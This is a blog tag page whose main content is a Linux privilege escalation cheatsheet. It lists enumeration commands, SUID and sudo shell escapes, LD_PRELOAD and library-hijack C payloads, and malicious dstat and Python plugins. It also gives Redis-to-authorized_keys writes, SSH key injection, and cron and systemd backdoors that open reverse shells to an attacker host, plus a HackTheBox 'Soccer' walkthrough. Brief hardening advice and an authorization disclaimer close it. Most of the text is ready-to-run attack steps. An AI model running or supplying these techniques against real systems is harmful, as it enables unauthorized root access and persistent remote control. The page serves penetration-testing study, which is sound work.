@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Sudo | realspaceeagle</title>
+<meta name="keywords" content="">
+<meta name="description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
+<meta name="author" content="realspaceeagle">
+<link rel="canonical" href="https://realspaceeagle.github.io/tags/sudo/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.a482bf00fa5c046040ef7973ad5fdf5657890cacb596c93f1382f664ca542074.css" integrity="sha256-pIK/APpcBGBA73lzrV/fVleJDKy1lsk/E4L2ZMpUIHQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="icon" type="image/png" sizes="32x32" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="apple-touch-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<link rel="mask-icon" href="https://realspaceeagle.github.io/favicon.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="https://realspaceeagle.github.io/tags/sudo/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="https://realspaceeagle.github.io/tags/sudo/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="realspaceeagle">
+<meta name="robots" content="index, follow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+<link rel="canonical" href="https://realspaceeagle.github.io/tags/sudo/">
+
+
+<meta property="og:title" content="Sudo">
+<meta property="og:description" content="">
+<meta property="og:url" content="https://realspaceeagle.github.io/tags/sudo/">
+<meta property="og:site_name" content="realspaceeagle">
+<meta property="og:locale" content="en_US"><meta property="og:type" content="website"><meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta property="og:image:alt" content="realspaceeagle">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@haran_loga">
+<meta name="twitter:creator" content="@haran_loga">
+<meta name="twitter:title" content="Sudo">
+<meta name="twitter:description" content=""><meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+  <meta name="twitter:image:alt" content="realspaceeagle">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org","@type": "WebPage",
+  "name": "Sudo",
+  "description": "",
+  "url": "https:\/\/realspaceeagle.github.io\/tags\/sudo\/",
+  "publisher": {
+    "@type": "Person",
+    "name": "realspaceeagle",
+    "jobTitle": "Cybersecurity Professional \u0026 Penetration Tester",
+    "url": "https:\/\/realspaceeagle.github.io\/"
+  }}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position": 1,
+      "name": "Home",
+      "item": "https:\/\/realspaceeagle.github.io\/"
+    }]
+}
+</script>
+
+
+<link rel="stylesheet" href="/css/terminal-style.css">
+
+
+<link rel="stylesheet" href="/css/scroll-enhancement.css">
+
+
+<link rel="stylesheet" href="/css/mobile-navigation.css">
+
+
+<link rel="stylesheet" href="/css/mobile-responsive-pages.css">
+
+
+<link rel="stylesheet" href="/css/header-width-fix.css">
+
+
+<link rel="stylesheet" href="/css/share-buttons.css">
+
+
+<link rel="stylesheet" href="/css/comments.css">
+
+
+<link rel="stylesheet" href="/css/blog-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/blog-sidebar.css">
+
+
+<link rel="stylesheet" href="/css/project-toggle.css">
+
+
+<link rel="stylesheet" href="/css/code-copy-enhancements.css">
+
+
+<link rel="stylesheet" href="/css/ctf-writeup.css">
+
+
+<link rel="stylesheet" href="/css/github-stats.css">
+
+
+<link rel="stylesheet" href="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar-responsive.css" onerror="this.remove();" />
+<script src="https://unpkg.com/github-calendar@2.3.4/dist/github-calendar.min.js" onerror="this.remove();"></script>
+
+
+<script src="/js/github-calendar-enhanced.js" defer></script>
+
+
+<script src="/js/github-contribution-tracker.js" defer></script>
+
+
+<script src="/js/github-api-fallback.js" defer></script>
+
+
+<script src="/js/github-integration.js" defer></script>
+
+
+<script src="/js/twitter-timeline.js" defer></script>
+<script src="/js/twitter-manual.js" defer></script>
+
+
+<script src="/js/code-copy-enhanced.js" defer></script>
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-GPTRZ14YZS"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-GPTRZ14YZS');
+        }
+      </script><meta property="og:url" content="https://realspaceeagle.github.io/tags/sudo/">
+  <meta property="og:site_name" content="realspaceeagle">
+  <meta property="og:title" content="Sudo">
+  <meta property="og:description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="website">
+      <meta property="og:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://realspaceeagle.github.io/images/og-image.svg">
+<meta name="twitter:title" content="Sudo">
+<meta name="twitter:description" content="Expert cybersecurity insights, penetration testing tutorials, and hands-on security demonstrations. Learn ethical hacking, network security, and defensive techniques with real-world scenarios.">
+
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://realspaceeagle.github.io/" accesskey="h" title="realspaceeagle (Alt + H)">realspaceeagle</a>
+            
+            
+            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle mobile menu">
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+                <span class="hamburger-line"></span>
+            </button>
+            
+            <div class="logo-switches">
+                
+                <div class="social-icons">
+                    <a href="https://www.linkedin.com/in/dream4ip/" target="_blank" rel="noopener noreferrer" 
+                       title="Connect on LinkedIn" aria-label="LinkedIn Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                        </svg>
+                    </a>
+                    <a href="https://twitter.com/haran_loga" target="_blank" rel="noopener noreferrer" 
+                       title="Follow on X/Twitter" aria-label="Twitter Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                        </svg>
+                    </a>
+                    <a href="https://github.com/realspaceeagle" target="_blank" rel="noopener noreferrer" 
+                       title="View Code on GitHub" aria-label="GitHub Profile" class="social-link">
+                        <svg width="4" height="4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                        </svg>
+                    </a>
+                </div>
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        
+        <ul id="menu" class="desktop-menu">
+            <li>
+                <a href="https://realspaceeagle.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                    <span>Cheatsheets</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+        
+        
+        <div id="mobile-menu" class="mobile-menu">
+            <ul class="mobile-menu-list">
+                <li>
+                    <a href="https://realspaceeagle.github.io/" title="Home">
+                        <span>Home</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/about/" title="About">
+                        <span>About</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/archives/" title="Archives">
+                        <span>Archives</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/cheatsheets/" title="Cheatsheets">
+                        <span>Cheatsheets</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/search/" title="Search" accesskey=/>
+                        <span>Search</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/tags/" title="Tags">
+                        <span>Tags</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/categories/" title="Categories">
+                        <span>Categories</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/projects/" title="Projects">
+                        <span>Projects</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://realspaceeagle.github.io/contact/" title="Contact">
+                        <span>Contact</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+</header>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
+    const mobileMenu = document.getElementById('mobile-menu');
+    const body = document.body;
+    
+    if (mobileMenuToggle && mobileMenu) {
+        mobileMenuToggle.addEventListener('click', function() {
+            const isOpen = mobileMenu.classList.contains('active');
+            
+            if (isOpen) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            } else {
+                mobileMenu.classList.add('active');
+                mobileMenuToggle.classList.add('active');
+                body.classList.add('mobile-menu-open');
+            }
+        });
+        
+        
+        const mobileMenuLinks = mobileMenu.querySelectorAll('a');
+        mobileMenuLinks.forEach(link => {
+            link.addEventListener('click', function() {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            });
+        });
+        
+        
+        document.addEventListener('click', function(event) {
+            if (!mobileMenu.contains(event.target) && !mobileMenuToggle.contains(event.target)) {
+                mobileMenu.classList.remove('active');
+                mobileMenuToggle.classList.remove('active');
+                body.classList.remove('mobile-menu-open');
+            }
+        });
+    }
+});
+</script><main class="main"> 
+<header class="page-header"><div class="breadcrumbs"><a href="https://realspaceeagle.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://realspaceeagle.github.io/tags/">Tags</a></div>
+  <h1>
+    Sudo
+  </h1>
+</header>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Linux Privilege Escalation Cheatsheet
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Linux Privilege Escalation Cheatsheet Initial Enumeration System Information # Basic system info uname -a cat /etc/os-release cat /etc/issue hostname # Current user context id whoami groups cat /etc/passwd | grep sh # Environment variables env printenv echo $PATH User and Group Enumeration # List all users cat /etc/passwd # Users with login shells cat /etc/passwd | grep sh # Current user privileges sudo -l find / -user $(whoami) 2&gt;/dev/null | grep -v &#39;^/proc\|^/run\|^/sys&#39; find / -group $(whoami) 2&gt;/dev/null | grep -v &#39;^/proc\|^/run\|^/sys&#39; # Check for interesting group memberships groups id # Find files owned by current user find / -user $(id -u) 2&gt;/dev/null find / -group $(id -g) 2&gt;/dev/null SUID and SGID Analysis Finding SUID/SGID Binaries # Find SUID binaries find / -perm -u=s -type f 2&gt;/dev/null find / -perm -4000 -type f 2&gt;/dev/null # Find SGID binaries find / -perm -g=s -type f 2&gt;/dev/null find / -perm -2000 -type f 2&gt;/dev/null # Find both SUID and SGID find / -perm -u=s -o -perm -g=s -type f 2&gt;/dev/null # Common SUID binaries to check ls -la /usr/bin/passwd ls -la /usr/bin/sudo ls -la /usr/bin/su ls -la /usr/local/bin/doas GTFOBins Exploitation # Check GTFOBins for binary exploitation # https://gtfobins.github.io/ # Common exploitable SUID binaries: # - /usr/bin/find find . -exec /bin/sh -p \; -quit # - /usr/bin/vim vim -c &#39;:!/bin/sh&#39; # - /usr/bin/less less /etc/profile !/bin/sh # - /usr/bin/more more /etc/profile !/bin/sh # - /usr/bin/nmap (older versions) nmap --interactive !sh # - /usr/bin/awk awk &#39;BEGIN {system(&#34;/bin/sh&#34;)}&#39; doas Privilege Escalation doas Configuration Analysis # Find doas binary and configuration find / -name doas 2&gt;/dev/null find / -name doas.conf 2&gt;/dev/null # Common doas locations ls -la /usr/local/bin/doas ls -la /usr/local/etc/doas.conf # Check doas configuration cat /usr/local/etc/doas.conf # Example vulnerable configuration: # permit nopass player as root cmd /usr/bin/dstat doas Exploitation Techniques # Basic doas command execution doas /usr/bin/dstat # Check what commands are allowed doas -n /usr/bin/dstat --help # If specific command is allowed, look for ways to abuse it # Example: dstat with custom plugins # doas with dstat privilege escalation # 1. Check if you can write to dstat plugin directory find / -group $(id -g) 2&gt;/dev/null | grep dstat ls -la /usr/local/share/dstat # 2. Create malicious dstat plugin echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; /usr/local/share/dstat/dstat_exploit.py # 3. Execute with doas doas /usr/bin/dstat --exploit doas vs sudo Differences # doas syntax doas command # doas with specific user doas -u root command # Check doas configuration syntax # permit [options] identity [as target] [cmd command [args ...]] # Common doas misconfigurations: # - permit nopass user as root cmd /path/to/binary # - Allowing commands that can spawn shells # - Wildcard permissions sudo Privilege Escalation sudo Enumeration # Check sudo privileges sudo -l # Check sudo version sudo --version # Common sudo misconfigurations: # - NOPASSWD entries # - Wildcard permissions # - Commands that allow shell escapes sudo Exploitation Examples # sudo with shell escape commands sudo vim :!/bin/bash sudo less /etc/profile !/bin/bash sudo find /etc -name &#34;*.conf&#34; -exec /bin/bash \; # sudo with environment variables sudo -E /bin/bash # sudo with LD_PRELOAD echo &#39;int main() { setgid(0); setuid(0); system(&#34;/bin/bash&#34;); return 0; }&#39; &gt; /tmp/exploit.c gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles sudo LD_PRELOAD=/tmp/exploit.so /bin/bash # sudo with LD_LIBRARY_PATH mkdir /tmp/lib echo &#39;int main() { setgid(0); setuid(0); system(&#34;/bin/bash&#34;); return 0; }&#39; &gt; /tmp/lib/exploit.c gcc -fPIC -shared -o /tmp/lib/libc.so.6 /tmp/lib/exploit.c sudo LD_LIBRARY_PATH=/tmp/lib /bin/bash Writable Directory Exploitation Finding Writable Directories # Find world-writable directories find / -type d -perm -002 2&gt;/dev/null # Find directories writable by current user find / -type d -writable 2&gt;/dev/null # Find directories owned by current user find / -type d -user $(whoami) 2&gt;/dev/null # Common locations to check ls -la /tmp ls -la /var/tmp ls -la /dev/shm ls -la /usr/local/share PATH Manipulation # Check current PATH echo $PATH # Create malicious binary in writable directory echo &#39;#!/bin/bash\n/bin/bash -p&#39; &gt; /tmp/ls chmod &#43;x /tmp/ls # Modify PATH to prioritize malicious binary export PATH=/tmp:$PATH # Wait for privileged process to execute our binary # Or trigger execution through cron jobs, scripts, etc. Library Hijacking # Check for writable library directories find / -type d -writable 2&gt;/dev/null | grep -E &#34;(lib|lib64)&#34; # Check LD_LIBRARY_PATH in processes ps aux | grep -i ld_library # Create malicious shared library echo &#39;void _init() { setgid(0); setuid(0); system(&#34;/bin/bash&#34;); }&#39; &gt; /tmp/exploit.c gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles # Place in writable library directory cp /tmp/exploit.so /writable/lib/directory/ Process and Service Analysis Running Processes # List all processes ps aux ps -ef --forest # Processes running as root ps aux | grep root # Network connections ss -tlnp netstat -tulnp # Check for processes with interesting capabilities /sbin/getcap -r / 2&gt;/dev/null Cron Jobs and Scheduled Tasks # System cron jobs cat /etc/crontab ls -la /etc/cron.* crontab -l # User cron jobs crontab -l cat /var/spool/cron/crontabs/* # Systemd timers systemctl list-timers find /etc/systemd -name &#34;*.timer&#34; Services and Sockets # Running services systemctl list-units --type=service --state=running # Check service files for misconfigurations find /etc/systemd -name &#34;*.service&#34; -exec grep -l &#34;User\|Group&#34; {} \; # Socket files systemctl list-units --type=socket find /etc/systemd -name &#34;*.socket&#34; File System Analysis Configuration Files # Check for readable sensitive files find /etc -readable -type f 2&gt;/dev/null | head -20 # Database configuration files find / -name &#34;*.conf&#34; -o -name &#34;*.config&#34; -o -name &#34;*.cfg&#34; 2&gt;/dev/null | grep -E &#34;(sql|db|database)&#34; # Web application configs find / -name &#34;wp-config.php&#34; -o -name &#34;config.php&#34; -o -name &#34;.env&#34; 2&gt;/dev/null # SSH keys and certificates find / -name &#34;id_rsa&#34; -o -name &#34;id_dsa&#34; -o -name &#34;*.pem&#34; -o -name &#34;*.key&#34; 2&gt;/dev/null Log Files # System logs find /var/log -readable -type f 2&gt;/dev/null # Application logs find / -name &#34;*.log&#34; -readable 2&gt;/dev/null | head -10 # Check logs for passwords or sensitive information grep -r -i &#34;password\|passwd\|secret\|token&#34; /var/log/ 2&gt;/dev/null Backup Files # Find backup files find / -name &#34;*.bak&#34; -o -name &#34;*.backup&#34; -o -name &#34;*.old&#34; -o -name &#34;*~&#34; 2&gt;/dev/null # Database backups find / -name &#34;*.sql&#34; -o -name &#34;*.dump&#34; -o -name &#34;*.db&#34; 2&gt;/dev/null # Configuration backups find /etc -name &#34;*.bak&#34; -o -name &#34;*.old&#34; -o -name &#34;*.orig&#34; 2&gt;/dev/null Application-Specific Exploits dstat Plugin Exploitation # Check dstat plugin directories find / -name &#34;*dstat*&#34; -type d 2&gt;/dev/null ls -la /usr/share/dstat ls -la /usr/local/share/dstat # Check permissions on plugin directory ls -la /usr/local/share/dstat # Create malicious dstat plugin cat &gt; /usr/local/share/dstat/dstat_exploit.py &lt;&lt; &#39;EOF&#39; import os os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;]) EOF # Execute with doas/sudo doas /usr/bin/dstat --exploit Python Library Hijacking # Check Python path python -c &#34;import sys; print(&#39;\n&#39;.join(sys.path))&#34; # Find writable Python directories python -c &#34;import sys; print(&#39;\n&#39;.join([p for p in sys.path if __import__(&#39;os&#39;).access(p, __import__(&#39;os&#39;).W_OK)]))&#34; # Create malicious module echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; /writable/python/path/exploit.py # Import in vulnerable application python -c &#34;import exploit&#34; Binary Wrapper Exploitation # Create wrapper script for allowed commands cat &gt; /tmp/malicious_script &lt;&lt; &#39;EOF&#39; #!/bin/bash /bin/bash -p EOF chmod &#43;x /tmp/malicious_script # If PATH manipulation is possible export PATH=/tmp:$PATH # Or create binary with same name as allowed command cp /bin/bash /tmp/allowed_binary_name Kernel and System Exploits Kernel Version Checking # Kernel version uname -r cat /proc/version # Check for known kernel exploits searchsploit linux kernel $(uname -r) # Distribution-specific exploits lsb_release -a cat /etc/os-release Common Kernel Exploits # Dirty COW (CVE-2016-5195) # Affects Linux kernel versions 2.6.22 to 4.8.3 # DirtyCOW PoC echo &#39;int main() { setuid(0); system(&#34;/bin/bash&#34;); return 0; }&#39; &gt; /tmp/cow.c gcc -o /tmp/cow /tmp/cow.c # Check for vulnerable kernel if [[ $(uname -r | cut -d. -f1-2) &lt; &#34;4.9&#34; ]]; then echo &#34;Potentially vulnerable to DirtyCOW&#34; fi Container Escape Techniques Docker Container Detection # Check if running in container cat /proc/1/cgroup | grep docker ls -la /.dockerenv # Check for container runtime ps aux | grep -E &#34;(docker|containerd|runc)&#34; # Check capabilities /sbin/getcap -r / 2&gt;/dev/null capsh --print Container Privilege Escalation # Check for privileged container cat /proc/self/status | grep Cap # Check for host filesystem mounts mount | grep -E &#34;/(proc|sys|dev)&#34; # Look for Docker socket find / -name &#34;docker.sock&#34; 2&gt;/dev/null # Check for host processes visible ps aux | wc -l Network-Based Privilege Escalation Internal Network Discovery # Network interfaces ip addr show ifconfig -a # ARP table arp -a ip neigh show # Network connections ss -tulnp netstat -tulnp # Port scanning internal network for i in {1..254}; do ping -c 1 192.168.1.$i &amp;&gt;/dev/null &amp;&amp; echo &#34;192.168.1.$i is up&#34;; done Service Exploitation # Check for internal services nmap -sT -O localhost ss -tlnp | grep LISTEN # Database connections mysql -u root -p psql -U postgres # Redis exploitation redis-cli CONFIG GET dir CONFIG SET dir /root/.ssh CONFIG SET dbfilename authorized_keys SET crackit &#34;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&#34; SAVE Persistence Mechanisms SSH Key Injection # Generate SSH key pair ssh-keygen -t rsa -f /tmp/key # Add public key to authorized_keys echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&#34; &gt;&gt; /root/.ssh/authorized_keys echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...&#34; &gt;&gt; /home/user/.ssh/authorized_keys # Set proper permissions chmod 600 /root/.ssh/authorized_keys chmod 700 /root/.ssh Cron Job Backdoors # Add malicious cron job echo &#34;* * * * * /bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/attacker_ip/port 0&gt;&amp;1&#39;&#34; &gt;&gt; /etc/crontab # User-specific cron crontab -e # Add: * * * * * /path/to/backdoor Service Backdoors # Create systemd service cat &gt; /etc/systemd/system/backdoor.service &lt;&lt; &#39;EOF&#39; [Unit] Description=System Backdoor After=network.target [Service] Type=simple User=root ExecStart=/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/attacker_ip/port 0&gt;&amp;1&#39; Restart=always [Install] WantedBy=multi-user.target EOF systemctl enable backdoor.service systemctl start backdoor.service Automated Enumeration Tools LinPEAS # Download and run LinPEAS curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh # Or transfer and run wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh chmod &#43;x linpeas.sh ./linpeas.sh LinEnum # Download LinEnum wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh chmod &#43;x LinEnum.sh ./LinEnum.sh LSE (Linux Smart Enumeration) # Download and run LSE wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh chmod &#43;x lse.sh ./lse.sh -l1 # Level 1 checks ./lse.sh -l2 # Level 2 checks Real-World Example: Soccer HTB doas/dstat Initial Discovery # Found user can write to dstat plugin directory player@soccer:/usr/local/share$ find / -group player 2&gt;/dev/null | grep -v &#39;^/proc\|^/run\|^/sys&#39; /usr/local/share/dstat # Check doas configuration player@soccer:~$ cat /usr/local/etc/doas.conf permit nopass player as root cmd /usr/bin/dstat # Check directory permissions player@soccer:/usr/local/share$ ls -la drwxrwx--- 2 root player 4096 Dec 12 2022 dstat Exploitation # Create malicious dstat plugin echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; /usr/local/share/dstat/dstat_exploit.py # Execute with doas doas /usr/bin/dstat --exploit # Alternative method using GTFOBins reference mkdir -p ~/.dstat echo &#39;import os; os.execv(&#34;/bin/sh&#34;, [&#34;sh&#34;])&#39; &gt; ~/.dstat/dstat_exploit.py doas /usr/bin/dstat --exploit Prevention and Hardening Secure Configuration Practices # Proper doas configuration # Use specific commands only, avoid wildcards permit nopass user as root cmd /usr/bin/specific-binary arg1 arg2 # Secure sudo configuration # Avoid NOPASSWD where possible # Use command aliases for complex commands # Regularly audit sudo rules # File permission hardening # Remove world-writable permissions find / -type d -perm -002 -exec chmod o-w {} \; find / -type f -perm -002 -exec chmod o-w {} \; Monitoring and Detection # Monitor privilege escalation attempts auditctl -w /etc/passwd -p wa -k passwd_changes auditctl -w /etc/shadow -p wa -k shadow_changes auditctl -w /etc/sudoers -p wa -k sudo_changes # Log sudo/doas usage # Configure proper logging in /etc/sudoers or doas.conf # File integrity monitoring # Use tools like AIDE or Tripwire to monitor critical files Always ensure you have proper authorization before attempting privilege escalation on any system. These techniques should only be used for legitimate security testing and system administration purposes.
+</p>
+  </div>
+  <footer class="entry-footer"><span title='2024-01-01 00:00:00 +0000 UTC'>January 1, 2024</span>&nbsp;·&nbsp;<span>9 min</span>&nbsp;·&nbsp;<span>realspaceeagle</span></footer>
+  <a class="entry-link" aria-label="post link to Linux Privilege Escalation Cheatsheet" href="https://realspaceeagle.github.io/cheatsheets/linux-privilege-escalation/"></a>
+</article>
+    </main>
+    <footer class="footer">
+  <div class="footer_inner wrap">
+    <div class="footer_text">
+      © 2025 realspaceeagle
+    </div>
+  </div>
+</footer>
+</body>
+
+</html>
